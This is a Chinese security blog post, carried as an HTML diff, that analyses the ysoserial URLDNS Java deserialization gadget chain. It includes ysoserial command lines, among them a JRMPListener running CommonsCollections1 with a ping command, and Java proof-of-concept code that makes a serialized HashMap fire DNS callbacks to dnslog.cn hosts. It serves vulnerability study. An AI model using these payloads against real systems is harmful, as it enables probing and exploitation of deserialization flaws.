@@ -1,0 +1,529 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>yso之URLDNS链 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    yso之URLDNS链
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-24 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/pe3-Tsqw7/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="前言">前言</h2>
+<p>文章首发于tools:<a href="https://www.t00ls.cc/thread-64391-1-1.html">yso之URLDNS链</a></p>
+<h2 id="java反序列化">Java反序列化</h2>
+<p>Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件后，相当于可以持久保存一个对象，这过程叫做序列化。序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
+<p>而反序列化是使用了<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
+<p>这一步骤并没有什么安全问题，但是如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p>
+<h2 id="ysoserial">ysoserial</h2>
+<p>因为java序列化后的数据为不可见字符，不方便构造，所以此项目帮你生成反序列化poc的脚本，但是并不会提供反序列化的点。</p>
+<h3 id="项目地址">项目地址</h3>
+<pre><code>https://github.com/angelwhu/ysoserial
+</code></pre>
+<h3 id="使用">使用</h3>
+<p>主要有两种使用方式，一种是运行ysoserial.jar 中的主类函数，另一种是运行ysoserial中的exploit 类，二者的效果是不一样的，一般用第二种方式开启交互服务</p>
+<ul>
+<li>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar [payload] '[command]'</li>
+<li>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://fq3jq6.dnslog.cn</li>
+<li>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections1 'ping   test.fq3jq6.dnslog.cn'</li>
+</ul>
+<h3 id="项目结构">项目结构</h3>
+<pre><code>│  GeneratePayload.java {{生成poc的入口函数}}
+│  Deserializer.java {{反序列化模块}}
+│  Serializer.java {{序列化模块}}
+│  Strings.java {{字符处理模块}}
+│
+├─exploit {{一些直接调用的exp}}
+│      JBoss.java
+│      JenkinsCLI.java
+│      JenkinsListener.java
+│      ......
+│ 
+├─payloads {{生成gadget poc的代码}}
+│  │  CommonsBeanutils1.java
+│  │  URLDNS.java
+│  │  .....
+│  │
+│  ├─annotation {{一些不重要的配置}}
+│  │      Authors.java
+│  │
+│  └─util  {{一些重复使用的单元}}
+│          ClassFiles.java
+│          Gadgets.java
+│
+└─secmgr {{和安全有关的管理}}
+        DelegateSecurityManager.java
+        ExecCheckingSecurityManager.java
+</code></pre>
+<h3 id="动态调试">动态调试</h3>
+<p>源码地址</p>
+<pre><code>https://github.com/frohoff/ysoserial
+</code></pre>
+<p>克隆到本地直接用idea打开，这时候IDEA会自动根据其中的配置下载依赖，只需要等待几分钟</p>
+<p>自动下载后最好在pom.xml那把剩下的依赖也解决了</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/45439fe555c3a94b3a5f52eb53a8d3a7.png" alt="image-20211231105506123" loading="lazy"></figure>
+<h3 id="程序入口">程序入口</h3>
+<p>首先找到程序的入口点，点开pom.xml搜索mainclass就可以找到入口点的类</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/67612e5d93b74b3fc874615a3e16e65b.png" alt="image-20211231112814866" loading="lazy"></figure>
+<p>ctrl+左键点击跟踪进去，运行测试一下。</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/ded51681fc42d49a9289b20436460ae9.png" alt="image-20211231112854798" loading="lazy"></figure>
+<p>需要参数</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/bce83bfea1074a1953be3461d60b2b60.png" alt="image-20211231112914880" loading="lazy"></figure>
+<p>主函数调用链</p>
+<pre><code>1处接受2个参数比如 URLDNS 'http://www.baidu.com'
+2处获得poc模块的类，这里就是URLDNS.java类
+3处实例化poc类以及将第二个参数传入类
+4处序列化一次然后输出（poc）
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/2893c0a55f9f618389336b92146713f5.png" alt="image-20220102082557584" loading="lazy"></figure>
+<p>在run-edit config中配置参数</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/0e5ba98e2cab3329345b9941afce558d.png" alt="image-20211231112932866" loading="lazy"></figure>
+<p>这里填入URLDNS链的启动参数</p>
+<pre><code>URLDNS http://fq3jq6.dnslog.cn
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/bff561ab5434bccac93a038a14421847.png" alt="image-20220102080716125" loading="lazy"></figure>
+<p>再次运行这样我们就获取到了一个序列化的数据。</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/8ff3e5a63ec4186b43ad8c5a82e1a16b.png" alt="image-20220102081540983" loading="lazy"></figure>
+<h2 id="手动构造pop链">手动构造pop链</h2>
+<h3 id="指定类的hashmap到指定类的hashcode">指定类的hashmap到指定类的hashcode</h3>
+<p><strong>tips</strong>:HashSet列表的add也会调用map.put只是链子更长而已</p>
+<pre><code class="language-java">HashMap&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();
+// 键不能重复，值可以重复
+map.put(&quot;san&quot;, &quot;张三&quot;);
+map.put(&quot;si&quot;, &quot;李四&quot;);
+map.put(&quot;wu&quot;, &quot;王五&quot;);
+map.put(&quot;wang&quot;, &quot;老王&quot;);
+map.put(&quot;wang&quot;, &quot;老王2&quot;);// 老王被覆盖
+map.put(&quot;lao&quot;, &quot;老王&quot;);
+System.out.println(&quot;-------直接输出hashmap:-------&quot;);
+System.out.println(map);
+</code></pre>
+<p>我们跟进put函数</p>
+<pre><code class="language-java">public V put(K key, V value) {
+    return putVal(hash(key), key, value, false, true);
+}
+</code></pre>
+<p>跟进从putVal到hash函数</p>
+<pre><code class="language-java">static final int hash(Object key) {
+int h;
+return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}
+</code></pre>
+<p>发现和hashCode相关。也就意味着当我们使用hashmap的put的时候，key会调用-&gt;hash(key)-&gt;然后调用key.hashCode()</p>
+<p>也就是说只要key是一个对象，那么我们可以调用任意对象的hanshCode函数</p>
+<p>那么又是怎么通过hashCode来发起dns请求的？</p>
+<h3 id="url类中的hashcode">URL类中的hashcode</h3>
+<p>URL.java 881，URL对象hashCode函数调用了handler.hashCode</p>
+<pre><code class="language-java">public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}
+</code></pre>
+<p>跟进handler.hashCode()（URLStreamHandler.java 350）,他是由URLStreamHandler类形成的对象，是一个抽象类</p>
+<p>用来处理协议（http/https）的建立连接</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/c9875cb63918027effbff0104a77eba1.png" alt="image-20220106081242928" loading="lazy"></figure>
+<p>hashCode调用了getHostAddress函数</p>
+<pre><code class="language-java">protected int hashCode(URL u) {
+    int h = 0;
+
+    // Generate the protocol part.
+    String protocol = u.getProtocol();
+    if (protocol != null)
+        h += protocol.hashCode();
+
+    // Generate the host part.
+    InetAddress addr = getHostAddress(u);
+    ...........
+</code></pre>
+<p>跟进getHostAddress(u)（URLStreamHandler.java 433），看名字也知道是用来获取主机IP地址的</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/6f2b264563453186c25b8f519cd3188f.png" alt="image-20220106081517363" loading="lazy"></figure>
+<p>在其中调用了InetAddress.getByName</p>
+<pre><code class="language-java">protected synchronized InetAddress getHostAddress(URL u) {
+    if (u.hostAddress != null)
+        return u.hostAddress;
+
+    String host = u.getHost();
+    if (host == null || host.equals(&quot;&quot;)) {
+        return null;
+    } else {
+        try {
+            u.hostAddress = InetAddress.getByName(host);
+    .........................................
+</code></pre>
+<p>而InetAddress.getByName(host)就是DNS请求了</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/8907fa664651e9ee071784f32ce8c7fd.png" alt="image-20220106081842673" loading="lazy"></figure>
+<p>那么就清楚了,调用链map.put(Url,XX)-&gt;URL.hashCode-&gt;handler.hashCode-&gt;getHostAddress(u)-&gt;u.hostAddress=InetAddress.getByName(host);</p>
+<p>发出DNS请求，那么我们就可以简单构造一下</p>
+<pre><code class="language-java"> HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();
+        URL test_url= null;
+        try {
+            test_url = new URL(&quot;http://test.kei8v0.dnslog.cn&quot;);
+            hashMap.put(test_url, &quot;22222&quot;);
+            System.out.println(&quot;success&quot;);
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+        }
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/9e1a1067173fdf22d823a6a7d3505fb1.png" alt="image-20220102084357269" loading="lazy"></figure>
+<p>到这里成功执行了DNS请求</p>
+<h3 id="hashmap的反序列化">hashmap的反序列化</h3>
+<p>我们前往HashMap.java</p>
+<pre><code class="language-java">private void readObject(java.io.ObjectInputStream s)
+        throws IOException, ClassNotFoundException {
+            .........................
+            // Read the keys and values, and put the mappings in the HashMap
+            for (int i = 0; i &lt; mappings; i++) {
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    K key = (K) s.readObject();
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false); #！！！！！！！！！！！
+            }
+        }
+    }
+</code></pre>
+<p>发现readObject每个值也会调用putVal-&gt;hash(作用和HashMap中的put函数一致)，然后如果key为URL类型就会掉入前面URLDNS的链中，那么我们现在非常方便写代码</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    	//构造请求链
+        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();
+        URL url = new URL(&quot;http://lyyy.dr8m3e.dnslog.cn\n\n&quot;);
+        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        f.setAccessible(true);
+        f.set(url, 0);
+        hashMap.put(url, &quot;test&quot;);
+        f.set(url, -1);
+    	//序列化操作
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+        oos.writeObject(hashMap);
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+        ois.readObject();
+    }
+</code></pre>
+<p>这里前面进行构造，后面进行序列化以及反序列化触发</p>
+<p>有一个有意思的点是为了不让构造的时候触发dns请求影响结果判断，我们先使URL类中的hashCode值为0</p>
+<p>我们分析URL的hashCode</p>
+<pre><code class="language-java">public synchronized int hashCode() {
+      if (hashCode != -1)
+          return hashCode;
+
+      hashCode = handler.hashCode(this);
+      return hashCode;
+  }
+</code></pre>
+<p>发现hashCode为-1的时候才调用handler.hashCode()</p>
+<p>而hashCode定义为private int hashCode = -1;</p>
+<p>默认为-1，我们要在构造的时候不发起dns请求，所以我们要在put之前set为非-1的值</p>
+<p>注意在put结束后要恢复到-1，否则反序列化的时候也不会请求。<br>
+最后的利用链简化</p>
+<blockquote>
+<p>HashMap-&gt;readObject()</p>
+<p>HashMap-&gt;putVal()</p>
+<p>HashMap-&gt;hash()</p>
+<p>URL-&gt;hashCode()</p>
+<p>URLStreamHandler-&gt;hashCode()</p>
+<p>URLStreamHandler-&gt;getHostAddress()</p>
+<p>InetAddress-&gt;getByName()</p>
+</blockquote>
+<h2 id="urldns链分析">URLDNS链分析</h2>
+<p>URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。</p>
+<p>在一些漏洞利用没有回显的时候，我们也可以使用到该链来验证漏洞是否存在。</p>
+<p>调用jar包得到序列化后的数据，如果需要执行，需要对其做反序列化操作。这里先开始看看数据是怎么获取的</p>
+<p>打开<code>src/main/java/ysoserial/payloads/URLDNS.java</code>的源码</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/4cb8313d85bc07e7d30c3ba505b2bd0f.png" alt="image-20220102082052485" loading="lazy"></figure>
+<p>在注释中标明了调用链</p>
+<pre><code>*   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre>
+<p>和手动构造的前半部分一致</p>
+<p>在put地方打一个断点,再找到hashMap.readObject中的putVal打上断点</p>
+<p>开始调试直接跳到第二个点</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/b5c08026bc1504cce208d0955ba2c501.png" alt="image-20220102093856286" loading="lazy"></figure>
+<p>putVal调用了hash，key是自己指定的url：http://fq3jq6.dnslog.cn 通过readObject函数生成的URL对象</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/e213edffab717e4be6ec515dca1b7828.png" alt="image-20220106084457533" loading="lazy"></figure>
+<p>步入hash函数，这里key传入URL对象</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/d6e6a72f4e410d6f3492145c01f62923.png" alt="image-20220102094027361" loading="lazy"></figure>
+<p>所以调用了URL类的hashCode，继续步入hashCode</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/img_convert/ca97902a0d615b0ead46221ccea21679.png" alt="image-20220102094137895" loading="lazy"></figure>
+<p>hashCode=-1时去执行hadler.hashCode</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/img_convert/1e15c201c8ca8dbb0c06a9c0e82bc04a.png" alt="image-20220102094200704" loading="lazy"></figure>
+<p>执行getHostAddress，u为http://fq3jq6.dnslog.cn</p>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/img_convert/2aea34b2ac78ac7a6b1f52b0a13165cf.png" alt="image-20220102094238294" loading="lazy"></figure>
+<p>调用了InetAddress.getByName,成功发起dns请求，调用链和手动构造一模一样</p>
+<h2 id="本地使用yso测试">本地使用yso测试</h2>
+<p>本地进行反序列化测试一下，手动生成</p>
+<p><strong>tips</strong>:这里不能用powershell运行，会在文件头加上错误信息导致报错</p>
+<pre><code>java -jar ysoserial.jar URLDNS http://8q2frx.dnslog.cn &gt; out.bin
+</code></pre>
+<p>本地反序列化Demo</p>
+<pre><code class="language-java">import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+
+public class Helloworld{
+    public static void main(String[] args) throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+        ois.readObject();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/img_convert/d94d24a2742930378b2feba5dc8733d4.png" alt="image-20220102101028960" loading="lazy"></figure>
+<h2 id="探究冗余处理">探究冗余处理</h2>
+<p>那么yso是怎么处理构造时发出的dns请求呢？</p>
+<p>查看URLDNS源码可以发现，作者构造URL对象时使用了三个参数</p>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/img_convert/fb726970f867e9864da191cac3035ab2.png" alt="image-20220106085356304" loading="lazy"></figure>
+<p>来到析构函数查看，是可以通过指定处理程序解析来订制规范创建URL</p>
+<figure data-type="image" tabindex="22"><img src="https://img-blog.csdnimg.cn/img_convert/20dc5981eedb45f01658617ac6e9e973.png" alt="image-20220106085430453" loading="lazy"></figure>
+<p>也就是依赖handler来制定规范创建URL对象</p>
+<p>handler是上面创建的</p>
+<figure data-type="image" tabindex="23"><img src="https://img-blog.csdnimg.cn/img_convert/6d2f89c6e0114bff7c219d02273bc683.png" alt="image-20220106085748009" loading="lazy"></figure>
+<p>跟进</p>
+<pre><code class="language-java"> static class SilentURLStreamHandler extends URLStreamHandler {
+
+                protected URLConnection openConnection(URL u) throws IOException {
+                        return null;
+                }
+
+                protected synchronized InetAddress getHostAddress(URL u) {
+                        return null;
+                }
+        }
+</code></pre>
+<p>直接重写了getHostAddress()内容为返回空</p>
+<p>那么如果我们传入的handler为自己改写的时，创建URL对象调用hashCode函数就不能发起DNS请求了</p>
+<p><strong>那么为什么在反序列化的时候会有请求呢？</strong></p>
+<p>因为之前说过序列化只记录类的属性，而函数内容不管，所以这个对象的函数被重写并不影响序列化的结果。</p>
+<p>而反序列在被攻击端进行，只要序列化数据正常，自然可以正常发起DNS请求</p>
+<h2 id="总结">总结</h2>
+<p>URLDNS链</p>
+<ul>
+<li>
+<p>hashmap重写了readobject反序列化方法，而重写后的readobject方法调用了一系列方法最后发起dns请求</p>
+</li>
+<li>
+<p>使用的全部是JDK中内置的类和方法，不会有环境要求，所以利用范围大</p>
+</li>
+<li>
+<p>使用的全部是JDK中内置的类和方法，学习后对java源码理解更深入</p>
+</li>
+<li>
+<p>原生类的很多方法都会最后发起DNS请求，但是这里是对反序列化的探测，所以需要的是</p>
+<ul>
+<li>1.重写readObject函数</li>
+<li>2.重写后的readObject执行了危险操作（危险类/危险函数）</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考">参考</h2>
+<p><a href="https://bkfish.gitee.io/2020/05/29/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A83-ysoserial%E8%B0%83%E8%AF%95%E5%92%8C%E6%9E%84%E9%80%A0URLDNS%E7%9A%84pop%E9%93%BE/">java代码审计入门3-ysoserial调试和构造URLDNS的pop链</a></p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html">Java安全之URLDNS链</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/bosscmsv10-dai-ma-shen-ji/" class="post-title gt-a-link">
+                    BossCMSV1.0代码审计
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/yso-zhi-urldns-lian/" class="leancloud_visitors" data-flag-title="yso之URLDNS链">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
